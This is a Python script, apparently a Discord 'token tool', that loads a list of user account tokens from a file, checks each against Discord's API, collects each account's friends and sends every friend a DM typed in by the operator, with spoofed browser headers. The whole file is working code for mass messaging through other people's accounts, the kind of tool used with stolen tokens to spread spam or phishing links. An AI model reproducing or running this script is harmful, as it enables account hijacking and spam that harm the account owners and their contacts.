from concurrent.futures import process
from re import I
from tkinter import W
from turtle import title
import requests
import colorama
import time
from colorama import Fore, Back, Style
import json
colorama.init(autoreset=True)


def Inter():
    print(f"{Fore.LIGHTGREEN_EX} \n▄· ▄▌ ▄▄▄· .▄▄ · .▄▄ ·     ▄▄▄▄▄            ▄▄▌  .▄▄ · \n▐█▪██▌▐█ ▀█ ▐█ ▀. ▐█ ▀.     •██  ▪     ▪     ██•  ▐█ ▀. \n▐█▌▐█▪▄█▀▀█ ▄▀▀▀█▄▄▀▀▀█▄     ▐█.▪ ▄█▀▄  ▄█▀▄ ██▪  ▄▀▀▀█▄ \n▐█▀·.▐█ ▪▐▌▐█▄▪▐█▐█▄▪▐█     ▐█▌·▐█▌.▐▌▐█▌.▐▌▐█▌▐▌▐█▄▪▐█  \n▀ •  ▀  ▀  ▀▀▀▀  ▀▀▀▀      ▀▀▀  ▀█▄▀▪ ▀█▄▀▪.▀▀▀  ▀▀▀▀ \n              {Fore.GREEN}A unique production...")


def Status(stri):
    print(f'Status [{Fore.GREEN}>>>{Fore.WHITE}] {stri}')


Inter()
print(f'\n\nDM Content [{Fore.GREEN}???{Fore.WHITE}]  ')
message =input() 


def Format(table):
    ids = []

    for item in table:

        ids.append(item["id"])

    return ids


def get_information(x):

    res = requests.get("https://discord.com/api/v9/users/@me", headers={
        "Content-Type": "application/json",
        'authorization': x,
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36"
    })

    return res.json()

def check_token(x):

    res = requests.get("https://discord.com/api/v9/users/@me", headers={
        "Content-Type": "application/json",
        'authorization': x,
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36"
    })

    return res.status_code    


def get_friends(x):
    client_Information = get_information(x)
    client = client_Information['username'] + \
        '#' + client_Information['discriminator']

    Status(f'Friends scrape started! [{Fore.BLUE}{ client}{Fore.WHITE}]')

    res = requests.get("https://discord.com/api/v9/users/@me/relationships", headers={
        "Content-Type": "application/json",
        'authorization': x,
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36"
    })

    return res.json()


def get_channel(id, x):

    rec = []
    rec.append(id)

    res = requests.post("https://discord.com/api/v9/users/@me/channels", headers={
        "Content-Type": "application/json",
        'authorization': x,
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36"
    }, data=json.dumps({"recipients": rec}))

    return res.json()


def Main(token, msg):






    friends = Format(get_friends(token))

    for friend in friends:
        chan = get_channel(friend, token)
        uwu = chan['id']

        attempt = requests.post(f'https://discord.com/api/v9/channels/{uwu}/messages', headers={
            "Content-Type": "application/json",
            'authorization': token,
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36"
        }, data=json.dumps({"content": msg, "nonce": uwu, "tts": False}))

        if (attempt.status_code == 200):
            Status(f"Sucessfully DM'ed {chan['id']}")
        else:
            Status(f"Failed DM'ing {chan['id']}")
        time.sleep(.3)




tokens = open('tokens.txt','r')




tokens = open('./tokens.txt', 'r')
token_line = tokens.readlines()


for client in token_line:

    auth = check_token(client.replace('\n',''))

    if (auth == 200):
        Status('Token Valid!')
        Main(client.replace('\n',''), message)
    else:
        Status('Token is Invalid!')


    





